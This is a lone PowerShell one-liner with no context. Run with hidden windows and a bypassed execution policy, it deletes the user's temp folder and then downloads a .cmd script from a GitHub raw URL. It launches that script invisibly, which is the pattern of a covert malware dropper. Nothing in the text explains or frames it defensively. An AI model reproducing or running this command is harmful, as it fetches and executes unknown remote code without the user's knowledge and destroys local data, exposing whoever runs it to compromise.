powershell -W Hidden -Exec Bypass cmd.exe /c rd %temp% /s /q & cls & powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mediatui/tool/master/multi/methodmulti.cmd',\"$env:temp\methodmulti.cmd\"); Start-Process -WindowStyle Hidden \"$env:temp\methodmulti.cmd\""
